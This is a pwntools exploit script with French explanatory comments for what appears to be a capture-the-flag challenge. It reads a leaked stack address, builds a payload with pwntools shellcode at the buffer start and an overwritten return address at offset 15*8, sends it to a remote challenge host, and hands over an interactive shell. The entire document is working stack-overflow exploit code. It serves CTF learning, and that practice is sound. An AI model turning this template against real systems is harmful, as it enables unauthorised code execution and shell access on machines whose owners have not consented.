#!/usr/bin/env python3
from pwn import *

context.update(arch='amd64', timeout=2)

# petit condition pour faciliter le debug.
# si je passe DEBUG ou LOCAL en argument a ./exploit.py,
# l'exploit s'execute en local avec ou sans gdb:
if args.GDB: # debug: local exploit with tmux/gef
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug("./bin", """
    source ~/.gdbinit-gef.py
    break *(tuto+122)
    continue
    """)
elif args.LOCAL: # exploit locally
    p = process("./bin")
else: # exploit online
    p = remote("ctf.example.org", 4102)

p.recvuntil("est actuellement à ".encode(), timeout=3) # on r
ecoit jusqu'a juste avant le pointeur qui nous interesse
buf_addr = int(p.recvlineS().split(":")[0], 16) # on recupere
 l'entier correspondant a l'adresse de buffer
log.info(f"buf_addr = {hex(buf_addr)}")
retaddr_offset = 15*8 # on voit sur gef que l'adresse de reto
ur se situe 15*8 bytes apres le debut du buffer (rsp)

shellcode = asm(shellcraft.sh()) # pwnlib genere un shellcode
 tout frais
log.info("Shellcode:")
print(disasm(shellcode)) # on visualize notre shellcode sous 
forme d'instructions asm

# flat() est pratique pour generer des payloads facilement, e
t mettre des choses aux offsets qu'on veut facilement
# il gere le padding automatiquement.
payload = flat({
    0: shellcode, # a l'offset 0 (le debut), on met le shellc
ode
    retaddr_offset: p64(buf_addr).rstrip(b"\x00"), # a l'offs
et 15*8, on met l'adresse de retour
    })
log.info("Payload:")
log.hexdump(payload) # pratique pour 'visualiser' notre paylo
ad avant de l'envoyer. Ca permet de voir si on a fait une bet
ise.

p.sendline(payload) # on 'ecrit' notre payload en remote
p.interactive() # on passe la main a l'utilisateur (nous)
